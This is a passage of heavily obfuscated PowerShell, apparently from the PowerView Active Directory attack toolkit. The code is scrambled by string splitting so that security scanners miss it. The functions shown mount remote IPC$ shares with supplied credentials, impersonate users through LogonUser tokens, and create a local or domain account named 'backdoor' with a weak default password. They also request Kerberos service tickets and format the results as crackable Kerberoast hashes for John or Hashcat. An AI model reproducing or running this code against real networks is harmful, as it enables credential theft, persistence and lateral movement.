                ${CO`NtEXT} = &("{1}{0}{2}"-f'bjec','New-O','t') -TypeName ("{0}{14}{12}{5}{4}{9}{15}{3}{11}{6}{13}{10}{8}{7}{2}{1}"-f'Sys','text','n','anag','Servic','ectory','n','alCo','rincip','e','.P','eme','ir','t','tem.D','s.AccountM') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"do`Ma`in", ${COnnecTTa`R`GEt}, ${C`ReD`ENt`iAl}."uSe`R`NAME", ${cr`e`DEN`TiAL}.("{3}{4}{1}{0}{2}" -f'workCred','Net','ential','G','et').Invoke()."PASsw`O`RD")
            }
            else {
                ${C`onTe`xT} = &("{1}{0}{2}"-f '-','New','Object') -TypeName ("{8}{12}{6}{9}{1}{3}{10}{4}{2}{14}{0}{13}{11}{5}{7}"-f 'gem','rvices.Acc','M','o','nt','ontex','r','t','Sys','ySe','u','lC','tem.Directo','ent.Principa','ana') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"domA`IN", ${CoN`Ne`cT`TA`RgEt})
            }
        }
        else {
            if (${Ps`BouNdP`ARAMeT`eRs}[("{2}{1}{0}" -f 'ial','ent','Cred')]) {
                &("{0}{1}{2}" -f 'W','rite-Ve','rbose') ("{7}{1}{5}{0}{6}{8}{2}{4}{3}" -f'ext]','Co','ernate','s',' credential','nt',' ','[Get-Principal','Using alt')
                ${DOmA`i`NNAmE} = &("{1}{2}{0}" -f'main','Get-D','o') | &("{0}{3}{2}{1}" -f 'S','t','Objec','elect-') -ExpandProperty ("{0}{1}"-f 'N','ame')
                ${C`ON`TEXT} = &("{3}{1}{2}{0}" -f't','ew-O','bjec','N') -TypeName ("{3}{12}{4}{9}{14}{11}{5}{6}{13}{0}{1}{7}{10}{2}{15}{8}"-f'a','nag','t.Pri','S','Di','ic','es.Ac','eme','text','re','n','v','ystem.','countM','ctorySer','ncipalCon') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"Doma`iN", ${D`oM`A`inNAme}, ${CreD`e`N`TiaL}."usERN`Ame", ${credE`N`T`IaL}.("{4}{2}{5}{0}{1}{3}"-f 'orkCredenti','a','e','l','GetN','tw').Invoke()."P`ASSwORd")
            }
            else {
                ${Co`Nt`ExT} = &("{3}{1}{0}{2}" -f'j','-Ob','ect','New') -TypeName ("{3}{14}{11}{12}{7}{9}{2}{10}{5}{0}{4}{16}{13}{8}{1}{6}{15}" -f'm','ncipalCo','Ac','System.Dir','e','tManage','n','yServic','i','es.','coun','to','r','t.Pr','ec','text','n') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DOmA`IN")
            }
            ${o`BJE`c`TIdENtity} = ${iDEN`TI`Ty}
        }

        ${o`Ut} = &("{1}{2}{0}"-f 'ct','N','ew-Obje') ("{0}{2}{1}" -f 'PS','bject','O')
        ${O`UT} | &("{2}{1}{0}"-f 'ber','dd-Mem','A') ("{1}{3}{0}{2}" -f'o','No','perty','tepr') ("{1}{2}{0}"-f'ntext','C','o') ${coNte`xT}
        ${o`UT} | &("{0}{2}{1}"-f'Add-Mem','r','be') ("{0}{3}{2}{1}" -f 'Notepr','y','pert','o') ("{0}{1}{2}" -f'Ide','nt','ity') ${o`Bjec`TIden`T`ity}
        ${o`Ut}
    }
    catch {
        &("{1}{0}{2}" -f'ite-Warn','Wr','ing') ('[Get-'+'P'+'r'+'incipa'+'lC'+'ontext'+'] '+'Erro'+'r '+'cr'+'e'+'ating '+'bind'+'in'+'g '+'for'+' '+'objec'+'t'+' '+"('$Identity') "+'co'+'nt'+'ext '+': '+"$_")
    }
}


function AdD-Re`mOTE`coNNe`ct`IOn {


    [CmdletBinding(DeFauLTpArAMeTeRseTname = {"{1}{2}{3}{0}"-f'uterName','Co','m','p'})]
    Param(
        [Parameter(POSiTIOn = 0, mandATory = ${tr`UE}, pARaMETeRSeTNAme = "co`M`pUteRNA`ME", VaLuEfROMPipelInE = ${t`RuE}, vALuefRompiPeLinEbyProPerTynaME = ${t`Rue})]
        [Alias({"{0}{2}{1}"-f 'HostNa','e','m'}, {"{0}{1}{2}"-f 'dn','sho','stname'}, {"{0}{1}" -f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`oMPuTerN`AME},

        [Parameter(POSItIon = 0, ParAmETERsETNaME = "P`Ath", mAndaTOrY = ${Tr`UE})]
        [ValidatePattern({(("{2}{0}{4}{3}{1}" -f '1AD','D.*','1AD1AD1AD','1A','.*1AD')).("{1}{0}" -f 'epLaCE','r').Invoke('1AD','\')})]
        [String[]]
        ${Pa`TH},

        [Parameter(MandAtory = ${t`RUE})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDE`Nti`Al}
    )

    BEGIN {
        ${NeT`Re`S`O`URcEin`STanCE} =  ( get-CHildItem vARIAble:732m).vAlue::("{0}{1}{3}{2}"-f 'Cre','a','ce','teInstan').Invoke(${ne`TR`Es`ou`RcEw})
        ${n`e`TR`esOUrc`EInSTanCE}."D`wTypE" = 1
    }

    PROCESS {
        ${p`A`ThS} = @()
        if (${P`sbounDPA`RA`meTers}[("{0}{1}{2}"-f'Co','mputerNa','me')]) {
            ForEach (${tArGEtCo`M`PUtEr`NA`mE} in ${coM`PutE`RNamE}) {
                ${tArGeTC`O`M`PUtErnaME} = ${TA`RGE`TCoMPut`ERNAME}.("{1}{0}" -f 'm','Tri').Invoke('\')
                ${pA`Ths} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${PA`THS} += ,${Pa`TH}
        }

        ForEach (${tARge`TPA`Th} in ${p`ATHS}) {
            ${netrE`sOuR`cEIN`s`TA`Nce}."LpReMO`T`E`NamE" = ${tArgET`P`AtH}
            &("{3}{1}{2}{0}"-f 'e','ri','te-Verbos','W') ('['+'Add-R'+'e'+'mo'+'teCo'+'nnect'+'ion] '+'A'+'ttempt'+'ing'+' '+'t'+'o '+'mount:'+' '+"$TargetPath")

            
            
            ${R`eS`UlT} = ${m`pR}::("{1}{2}{0}{3}" -f'n','WNetAddC','on','ection2W').Invoke(${NetRE`sOur`C`EiNsTaN`cE}, ${CRE`D`en`TiaL}.("{2}{3}{4}{0}{5}{1}"-f 'workCreden','al','GetN','e','t','ti').Invoke()."PaSS`Word", ${CR`e`dEnt`IAl}."Us`er`NAme", 4)

            if (${r`Es`ULt} -eq 0) {
                &("{0}{1}{2}"-f 'Write','-Verbo','se') ("$TargetPath "+'s'+'u'+'cc'+'essfully '+'mount'+'ed')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function remOvE`-r`EMOT`ECONN`ec`TION {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{6}{2}{3}{1}{5}{0}{4}" -f 't','Cha','dProcessForSta','te','ions','ngingFunc','oul','PSUseSh'}, '')]
    [CmdletBinding(dEFAULTPaRamEterSeTNaME = {"{0}{2}{1}" -f 'C','terName','ompu'})]
    Param(
        [Parameter(pOSiTION = 0, mAnDatoRY = ${t`Rue}, PAraMetERSeTnamE = "C`oMPUTE`RNA`ME", VALUEfROMpIpEline = ${TR`Ue}, valuEfrOMpIpeLINeByproPertYName = ${T`RUE})]
        [Alias({"{2}{1}{0}"-f'me','Na','Host'}, {"{1}{2}{0}{3}" -f 'stn','d','nsho','ame'}, {"{1}{0}"-f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Compu`TER`NaME},

        [Parameter(PosITIon = 0, pArameterSetNAme = "P`Ath", MAndaTory = ${T`Rue})]
        [ValidatePattern({(("{1}{5}{3}{4}{2}{0}" -f'0}.*','{','{','0}{0}.*','{0}','0}{0}{'))  -f [cHAr]92})]
        [String[]]
        ${pa`TH}
    )

    PROCESS {
        ${pa`THs} = @()
        if (${PsBOUnd`pArAM`Et`Ers}[("{3}{0}{2}{1}"-f'terNa','e','m','Compu')]) {
            ForEach (${t`A`RgEtC`oMPUt`eR`NAMe} in ${C`OmPUt`ER`NAME}) {
                ${Ta`Rg`etCOMPUter`Na`Me} = ${tAr`GEtcOmp`UtErN`AMe}.("{0}{1}" -f 'Tr','im').Invoke('\')
                ${Pa`ThS} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${PAT`hS} += ,${pA`TH}
        }

        ForEach (${Ta`RgeTp`ATh} in ${P`A`THS}) {
            &("{2}{1}{0}"-f 'se','te-Verbo','Wri') ('[Remov'+'e-R'+'emoteCo'+'n'+'nec'+'tion] '+'A'+'ttempt'+'ing '+'to'+' '+'u'+'nmoun'+'t: '+"$TargetPath")
            ${rESU`LT} = ${m`Pr}::("{2}{4}{5}{1}{3}{6}{0}"-f'2','l','WNet','C','C','ance','onnection').Invoke(${ta`R`gETpatH}, 0, ${T`Rue})

            if (${re`SUlT} -eq 0) {
                &("{0}{2}{1}"-f'Writ','bose','e-Ver') ("$TargetPath "+'succ'+'essfu'+'l'+'ly '+'um'+'mount'+'ed')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function I`Nvok`E-U`serIm`peR`s`OnatIon {


    [OutputType([IntPtr])]
    [CmdletBinding(dEfaulTpARAmETERSETNAMe = {"{1}{0}{2}{3}"-f'e','Cred','nt','ial'})]
    Param(
        [Parameter(MaNdAToRY = ${T`Rue}, ParAMETeRSetNAME = "CR`eD`e`NTiaL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`DENtIaL},

        [Parameter(maNdaToRy = ${T`RUE}, PArameTERSEtnaMe = "t`O`kEN`hAnDle")]
        [ValidateNotNull()]
        [IntPtr]
        ${ToK`eN`HAndLE},

        [Switch]
        ${Q`UiET}
    )

    if ((  (  Item  VaRiable:X2n1V  ).vAlUe::"c`Ur`R`ENTThREAD".("{0}{2}{1}{3}"-f 'GetApartmen','a','tSt','te').Invoke() -ne 'STA') -and (-not ${Ps`B`oU`Ndpa`RaM`ETERS}[("{0}{1}" -f 'Q','uiet')])) {
        &("{2}{1}{0}{3}" -f 'Warnin','e-','Writ','g') ("{24}{22}{1}{23}{18}{5}{19}{15}{9}{25}{16}{7}{12}{6}{2}{11}{8}{14}{10}{21}{0}{13}{3}{20}{17}{4}"-f't state, ','-UserImpersonatio','e','ken i','k.','ow',' a singl','ently ','th','xe is n','eaded a','-','in','to','r','hell.e','urr','ation may not wor','p','ers','mperson','partmen','voke','n] ','[In','ot c')
    }

    if (${PsboUNDPA`R`AMET`Ers}[("{1}{0}{2}" -f 'ke','To','nHandle')]) {
        ${L`O`GOn`ToKENha`NdLE} = ${t`OKENHa`Ndle}
    }
    else {
        ${lOgontOkE`NHa`ND`LE} =   $1v4r::"ZE`Ro"
        ${ne`TwORK`cReDE`Nti`AL} = ${c`Redent`iaL}.("{3}{1}{0}{2}"-f'orkCred','tw','ential','GetNe').Invoke()
        ${usE`R`Dom`AiN} = ${ne`TW`OR`kCR`edE`NtIaL}."d`om`AIN"
        ${USE`RnamE} = ${NeTwo`RKcRE`D`e`NT`IaL}."U`seRnamE"
        &("{1}{3}{2}{0}" -f 'ng','W','ni','rite-War') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${ReS`ULt} = ${advap`I`32}::("{2}{1}{0}"-f'er','s','LogonU').Invoke(${U`SE`RNAme}, ${U`seR`D`omAIn}, ${N`ETwo`R`kcred`En`TIAL}."p`AS`sworD", 9, 3, [ref]${L`o`GoNTO`k`eNH`ANdlE});${la`ste`R`Ror} =   $O1f5::("{0}{1}{2}{3}{4}"-f 'GetLa','stW','in32','Err','or').Invoke();

        if (-not ${R`Es`ULt}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${RES`Ult} = ${aD`VAp`I32}::("{0}{4}{5}{3}{2}{1}" -f 'I','dOnUser','ateLogge','n','mp','erso').Invoke(${l`oGO`Nto`K`enhA`NDLE})

    if (-not ${ReS`U`Lt}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{3}{1}{0}{2}"-f'e-V','rit','erbose','W') ("{4}{3}{10}{6}{9}{11}{2}{8}{7}{1}{12}{0}{5}"-f'nat','y','redential','ke-','[Invo','ed','mper','sfull','s succes','sonation','UserI','] Alternate c',' imperso')
    ${LoGON`ToKe`NHanD`le}
}


function i`NvokE-`REvERTt`OSELF {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${TOKENha`Nd`lE}
    )

    if (${PS`B`oundpar`AM`etErS}[("{0}{3}{2}{1}" -f'To','dle','nHan','ke')]) {
        &("{1}{2}{3}{0}" -f'ing','Write-','W','arn') (("{1}{5}{17}{12}{7}{4}{9}{10}{19}{14}{0}{6}{15}{3}{8}{18}{16}{13}{2}{11}"-f'n','[Invoke-Rev','oken h',' a','n','ert','a','everti','nd cl','g token i','mp','andle','] R',') t','rso','tion','User(','ToSelf','osing Logon','e'))
        ${rEs`UlT} = ${Ke`RNEl`32}::("{3}{0}{1}{2}"-f'seH','a','ndle','Clo').Invoke(${t`oKe`NHa`NdlE})
    }

    ${res`UlT} = ${AdV`API32}::("{3}{1}{0}{2}"-f'oS','evertT','elf','R').Invoke();${LA`S`TER`RoR} =  (vaRiablE  ('O1'+'F5')  -VaLueoN )::("{2}{0}{3}{1}"-f 'tL','stWin32Error','Ge','a').Invoke();

    if (-not ${R`e`SulT}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{3}{0}{2}{1}"-f 'er','ose','b','Write-V') ("{17}{7}{6}{14}{8}{0}{5}{13}{2}{12}{3}{1}{15}{18}{4}{16}{10}{9}{11}" -f'] To','o','ers','ati','ce','ken i','Reve','ke-','Self',' re','sfully','verted','on','mp','rtTo','n su','s','[Invo','c')
}

function AD`D-`Ne`TuSEr {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${us`ERNA`me} = ("{0}{1}{2}" -f 'backdo','o','r'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${pa`SSwO`Rd} = ("{0}{3}{2}{1}" -f 'Pas','d123!','r','swo'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${grOUp`NA`ME},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'H','ostNam','e'})]
        [String]
        ${COMp`UTERn`A`Me} = ("{0}{1}" -f'localho','st'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`A`in}
    )

    if (${d`Omain}) {

        ${DomA`Ino`BJECT} = &("{1}{2}{0}"-f'-NetDomain','Ge','t') -Domain ${D`OmAIn}
        if(-not ${d`omainoBJ`eCt}) {
            &("{1}{2}{3}{0}" -f 'ing','W','ri','te-Warn') ('E'+'rror '+'in'+' '+'g'+'rabbi'+'ng '+"$Domain "+'o'+'b'+'ject')
            return ${n`UlL}
        }

        
        &("{0}{2}{1}" -f 'Ad','ype','d-T') -AssemblyName ("{6}{0}{5}{2}{8}{3}{1}{7}{4}" -f 'rySer','ag','ic','n','ent','v','System.Directo','em','es.AccountMa')

        
        
        ${CONT`e`XT} = &("{1}{2}{0}" -f 'ct','Ne','w-Obje') -TypeName ("{13}{3}{4}{16}{10}{5}{7}{9}{8}{1}{12}{14}{15}{11}{2}{17}{0}{6}"-f 'lC','na','p','ste','m.Direc','.A','ontext','cc','tMa','oun','oryServices','rinci','gem','Sy','en','t.P','t','a') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DO`Main"), ${dOm`Ai`NOBjECT}

        
        ${u`SEr} = &("{1}{0}{2}"-f'w-Objec','Ne','t') -TypeName ("{5}{3}{0}{4}{1}{8}{6}{2}{7}"-f 'ectoryS','i','erPrincipa','r','erv','System.Di','ountManagement.Us','l','ces.Acc') -ArgumentList ${coNT`E`xT}

        
        ${U`seR}."n`AmE" = ${USER`NA`me}
        ${U`sER}."s`AmaccOuNTn`AMe" = ${U`s`ErName}
        ${uS`ER}."P`ASswORDno`TRe`Q`UIRed" = ${F`ALSe}
        ${us`Er}.("{2}{1}{0}" -f 'd','wor','SetPass').Invoke(${PA`Ssw`ORd})
        ${uS`ER}."e`NaBL`eD" = ${Tr`Ue}

        &("{0}{2}{3}{1}"-f'W','bose','r','ite-Ver') ('C'+'rea'+'ting '+'u'+'ser '+"$UserName "+'to'+' '+'with'+' '+'pas'+'sword'+' '+"'$Password' "+'in'+' '+'do'+'m'+'ain '+"$Domain")

        try {
            
            ${U`Ser}.("{1}{0}" -f 'ave','S').Invoke()
            ('[*'+'] '+'U'+'ser '+"$UserName "+'succe'+'s'+'sf'+'u'+'lly '+'create'+'d'+' '+'in'+' '+'d'+'omain'+' '+"$Domain")
        }
        catch {
            &("{1}{2}{0}" -f 'arning','Write-','W') ("{3}{1}{4}{6}{0}{5}{2}" -f ' e','s','!','[!] U','er a','xists','lready')
            return
        }
    }
    else {

        &("{0}{2}{1}"-f 'Write-V','rbose','e') ('Cr'+'ea'+'ting'+' '+'use'+'r '+"$UserName "+'t'+'o '+'wi'+'th '+'p'+'a'+'ssword '+"'$Password' "+'on'+' '+"$ComputerName")

        
        ${ObJ`OU} = [ADSI]"WinNT://$ComputerName"
        ${Obj`US`Er} = ${o`B`jOU}.("{1}{0}" -f'te','Crea').Invoke(("{0}{1}" -f'Use','r'), ${u`SEr`NAMe})
        ${objUS`Er}.("{1}{2}{0}"-f'rd','SetPas','swo').Invoke(${p`AssWO`Rd})

        
        try {
            ${NU`LL} = ${Ob`JUs`ER}.("{1}{0}"-f'o','SetInf').Invoke()
            ('[*'+'] '+'Us'+'er '+"$UserName "+'succ'+'essfull'+'y'+' '+'c'+'reate'+'d '+'o'+'n '+'ho'+'st '+"$ComputerName")
        }
        catch {
            &("{2}{3}{1}{0}" -f'g','n','W','rite-Warni') ("{5}{3}{1}{2}{0}{4}" -f 't already e','] Accou','n','!','xists!','[')
            return
        }
    }

    
    if (${gr`oUP`NAME}) {
        
        if (${do`MA`In}) {
            &("{3}{0}{2}{4}{1}" -f 'dd-','r','N','A','etGroupUse') -UserName ${Us`ERNAmE} -GroupName ${gRO`UPnA`mE} -Domain ${dOm`AIn}
            ('['+'*] '+'Us'+'er '+"$UserName "+'succes'+'sf'+'ul'+'ly '+'add'+'ed '+'t'+'o '+'gro'+'u'+'p '+"$GroupName "+'i'+'n '+'d'+'oma'+'in '+"$Domain")
        }
        
        else {
            &("{4}{3}{0}{1}{2}"-f 'tGro','upU','ser','-Ne','Add') -UserName ${uS`Ern`Ame} -GroupName ${Gr`OuPn`A`mE} -ComputerName ${C`Om`PuTeRnA`me}
            ('[*]'+' '+'User'+' '+"$UserName "+'s'+'ucc'+'es'+'sfully '+'add'+'ed '+'to'+' '+'group'+' '+"$GroupName "+'o'+'n '+'h'+'ost '+"$ComputerName")
        }
    }
}

function get-do`mainsPNTi`Ck`eT {


    [OutputType({"{0}{1}{4}{3}{2}{5}" -f 'Power','V','PNTicke','w.S','ie','t'})]
    [CmdletBinding(DEfaUltpArAMEterSeTNAME = {"{1}{0}{2}"-f 'awSP','R','N'})]
    Param (
        [Parameter(POSItiOn = 0, paraMetErsEtnAmE = "RaW`sPn", MaNdATORY = ${T`RuE}, vaLuEfRompiPeLinE = ${TR`UE})]
        [ValidatePattern({"{0}{1}" -f'.*/','.*'})]
        [Alias({"{2}{1}{0}{4}{3}" -f 'a','icePrincip','Serv','me','lNa'})]
        [String[]]
        ${s`pn},

        [Parameter(PosITion = 0, PaRameTERsetNAme = "U`SeR", mandAtorY = ${TR`UE}, ValUEfRoMPipElIne = ${T`RUE})]
        [ValidateScript({ ${_}."P`SoBjeCT"."tyP`eNaM`eS"[0] -eq ("{3}{0}{1}{2}" -f'werV','ie','w.User','Po') })]
        [Object[]]
        ${u`seR},

        [ValidateSet({"{1}{0}" -f'ohn','J'}, {"{0}{1}"-f'Hash','cat'})]
        [Alias({"{1}{0}"-f 'ormat','F'})]
        [String]
        ${OuT`p`UT`Form`At} = ("{1}{0}" -f'n','Joh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CredE`N`TIAl} =   (gET-variaBLE ('0dsQ'+'R')  -vA )::"E`mPty"
    )

    BEGIN {
        ${nU`ll} =  ( VARiaBLE t83xJH).VALuE::("{1}{0}{3}{2}" -f'hParti','LoadWit','Name','al').Invoke(("{1}{0}{3}{2}{4}"-f 'tem.I','Sys','yMod','dentit','el'))

        if (${PsbOUn`D`P`AR`AMe`TErs}[("{2}{0}{1}"-f 'r','edential','C')]) {
            ${Lo`gont`o`Ken} = &("{2}{4}{3}{6}{0}{1}{5}" -f 'o','na','Invoke','UserIm','-','tion','pers') -Credential ${CrE`DEnt`ial}
        }
    }

    PROCESS {
        if (${p`sboU`ND`pARaM`ETerS}[("{0}{1}" -f'Us','er')]) {
            ${T`A`RGeTObJE`ct} = ${US`er}
        }
        else {
            ${TaRge`To`B`jECt} = ${S`pN}
        }

        ForEach (${o`BJeCT} in ${T`A`RgeTObje`ct}) {
            if (${P`sbOundpAr`AME`T`E`RS}[("{0}{1}"-f'U','ser')]) {
                ${u`SErsPn} = ${Ob`JeCT}."seRvIC`ep`Ri`N`Ci`Pa`LnAMe"
                ${samACC`oUNT`Na`mE} = ${ob`JE`CT}."sAMaCCo`UnT`NA`ME"
                ${di`S`TIng`UisHED`Name} = ${O`BJEcT}."dis`TinGu`ISHEDN`A`Me"
            }
            else {
                ${U`SE`RSpn} = ${o`BjE`CT}
                ${sAM`A`cCOuNTnAme} = ("{1}{0}" -f'NKNOWN','U')
                ${Disti`NG`UiSHE`DnaME} = ("{1}{0}{2}"-f 'N','U','KNOWN')
            }

            
            if (${US`e`RSPn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${USeR`sPn} = ${US`er`sPn}[0]
            }

            try {
                ${Ti`Ck`Et} = &("{2}{0}{1}" -f 'bjec','t','New-O') ("{10}{12}{2}{9}{1}{6}{7}{4}{0}{3}{5}{8}{11}" -f 'S','.Ke','m.I','ec','or','urityTo','rberosRequ','est','k','dentityModel.Tokens','Sys','en','te') -ArgumentList ${uSERS`PN}
            }
            catch {
                &("{0}{2}{1}{3}" -f'Wri','nin','te-War','g') ('[Get'+'-'+'D'+'omainS'+'PNTi'+'cket]'+' '+'Error'+' '+'reques'+'t'+'ing '+'t'+'i'+'cket '+'f'+'or '+'SPN'+' '+"'$UserSPN' "+'from'+' '+'use'+'r '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${T`IcK`et}) {
                ${TiC`Ket`B`YTESTrEAm} = ${TiCk`eT}.("{2}{0}{1}" -f'e','st','GetRequ').Invoke()
            }
            if (${tiC`k`ETbY`TEsTreaM}) {
                ${O`UT} = &("{1}{0}{2}" -f'Obje','New-','ct') ("{1}{0}"-f 'bject','PSO')

                ${tI`cKEt`heXST`REAM} =  ( GET-VaRiabLe ('2M'+'G')  ).value::("{2}{1}{0}" -f 'ring','St','To').Invoke(${TI`C`K`eTByTE`st`REaM}) -replace '-'

                
                
                if(${Ti`CKetHex`sTR`E`AM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${ET`ype} =   ( Get-vAriaBlE  ('w'+'tD42')  -VAl  )::("{2}{0}{1}"-f'By','te','To').Invoke( ${mAT`c`hES}."e`TYpe`leN", 16 )
                    ${CipheRtE`X`T`Len} =  ( geT-VAriAble  ("Wt"+"D42") -vaLueO )::("{1}{2}{0}" -f '2','ToU','Int3').Invoke(${MAt`C`heS}."Ci`pheRTE`XtL`EN", 16)-4
                    ${CiP`H`erTExT} = ${M`ATC`Hes}."Dat`Ato`enD".("{2}{0}{1}"-f 'ub','string','S').Invoke(0,${CiPHeR`T`ExTLeN}*2)

                    
                    if(${M`At`cHeS}."d`A`TAtoE`Nd".("{2}{1}{0}" -f 'ng','tri','Subs').Invoke(${cIPhERtE`x`TLEN}*2, 4) -ne ("{1}{0}" -f'482','A')) {
                        &("{2}{3}{0}{1}" -f'-','Warning','Writ','e') ('Err'+'o'+'r '+'parsi'+'ng'+' '+'c'+'ipherte'+'xt '+'f'+'or '+'th'+'e '+'SP'+'N '+' '+('IZa(IZaT'+'icket.Ser'+'vic'+'e'+'Pr'+'incipal'+'Name). ')."repl`Ace"('IZa',[stRING][Char]36)+'U'+'se '+'t'+'he '+'Ti'+'c'+'ketByteHexS'+'tr'+'eam '+'fi'+'eld '+'an'+'d '+'ex'+'trac'+'t '+'t'+'he '+'h'+'ash '+'o'+'f'+'fline '+'wit'+'h '+('Ge'+'t-Kerbe'+'roas'+'tHashF'+'romAPReqHz'+'V')."r`e`pLace"(([ChAr]72+[ChAr]122+[ChAr]86),[StrING][ChAr]34))
                        ${ha`Sh} = ${N`UlL}
                        ${O`Ut} | &("{0}{2}{3}{1}" -f 'Add-Mem','r','b','e') ("{2}{1}{0}"-f'y','epropert','Not') ("{1}{3}{2}{0}"-f'ream','Ticket','yteHexSt','B') (  (GEt-VArIaBLE sqpy8 ).vAlUE::("{0}{1}" -f'ToStrin','g').Invoke(${t`ic`Ke`T`ByT`eStREam}).("{0}{1}" -f 'Repla','ce').Invoke('-',''))
                    } else {
                        ${ha`SH} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${O`UT} | &("{2}{1}{0}"-f 'er','d-Memb','Ad') ("{1}{0}{2}{3}"-f'tepr','No','opert','y') ("{2}{1}{0}{3}" -f'HexStre','yte','TicketB','am') ${N`ULL}
                    }
                } else {
                    &("{2}{4}{3}{1}{0}" -f'ng','i','W','ite-Warn','r') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${h`ASh} = ${Nu`LL}
                    ${O`UT} | &("{2}{1}{0}" -f 'r','d-Membe','Ad') ("{0}{1}{2}"-f'N','oteprop','erty') ("{1}{2}{3}{4}{5}{0}" -f 'ream','T','i','cket','Byt','eHexSt') ( (  chILdiTeM  vARiabLE:SQPY8).vaLUE::("{0}{2}{1}" -f 'T','g','oStrin').Invoke(${T`I`C`KetBYtesTrEAm}).("{0}{1}" -f 'Rep','lace').Invoke('-',''))
                }

                if(${Ha`sh}) {
                    if (${OutpUtF`Orm`At} -match ("{1}{0}" -f 'n','Joh')) {
                        ${Ha`sHFOr`mAt} = "$($SamAccountName):`$krb5tgs`$$($Etype)`$$Hash"
                    }
                    else {
                        if (${distI`NGu`i`s`Hed`NAme} -ne ("{2}{1}{0}" -f'N','NKNOW','U')) {
                            ${US`eR`d`OmaIn} = ${diSTiN`GU`is`HEDn`AME}.("{0}{1}{2}" -f 'Su','bStrin','g').Invoke(${DIsTi`NgUi`she`dnAME}.("{2}{1}{0}"-f'f','dexO','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${useR`d`oMa`In} = ("{1}{0}"-f 'N','UNKNOW')
                        }

                        
                        ${hash`For`mAt} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${o`UT} | &("{2}{0}{1}" -f 'dd-Me','mber','A') ("{1}{0}{2}{3}"-f 'otepro','N','p','erty') ("{0}{1}" -f'Has','h') ${Ha`Shfo`RmAT}
                }

                ${O`Ut} | &("{2}{0}{1}"-f 'dd-Membe','r','A') ("{0}{1}{2}{3}"-f 'Notepr','o','pe','rty') ("{1}{0}{3}{2}"-f 'Accoun','Sam','me','tNa') ${sa`mACco`UNtNa`ME}
                ${o`Ut} | &("{1}{2}{0}" -f'ber','Add-M','em') ("{2}{0}{1}" -f'eproper','ty','Not') ("{4}{1}{0}{5}{3}{2}" -f 'ing','ist','dName','ishe','D','u') ${D`IS`TIN`GUI`SH`eDNamE}
                ${o`UT} | &("{1}{2}{0}" -f 'er','Add-M','emb') ("{0}{1}{2}"-f 'N','otep','roperty') ("{4}{0}{3}{2}{5}{1}"-f 'ePrin','e','N','cipal','Servic','am') ${tick`Et}."SeRVicePR`i`NcIpal`NAME"
                ${O`UT}."pso`BJect"."typEn`Am`ES".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{1}{3}{2}{0}"-f'cket','PowerView.','PNTi','S'))
                &("{2}{3}{0}{1}" -f 'tpu','t','Write-O','u') ${O`UT}
            }
        }
    }

    END {
        if (${lOGoNTo`k`EN}) {
            &("{2}{3}{1}{5}{4}{0}"-f'oSelf','e-R','Inv','ok','ertT','ev') -TokenHandle ${lOg`oNtOK`en}
        }
    }
}


function inV`o`Ke-KeRBE`RoA`st {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f'ro','uldP','cess','PSSho'}, '')]
    [OutputType({"{1}{0}{4}{5}{2}{3}" -f 'View.','Power','ick','et','SP','NT'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItion = 0, valuEFROMPIpelInE = ${Tr`Ue}, valuefROMPipELinebYPROpertynAmE = ${tr`Ue})]
        [Alias({"{5}{3}{1}{0}{2}{4}"-f'tinguished','s','Na','i','me','D'}, {"{3}{4}{0}{2}{1}"-f 'o','ntName','u','S','amAcc'}, {"{1}{0}" -f 'me','Na'}, {"{2}{4}{3}{1}{5}{6}{0}"-f 'ame','erDisting','M','mb','e','uished','N'}, {"{1}{0}{2}"-f 'rNa','Membe','me'})]
        [String[]]
        ${i`dEN`TiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOm`AIn},

        [ValidateNotNullOrEmpty()]
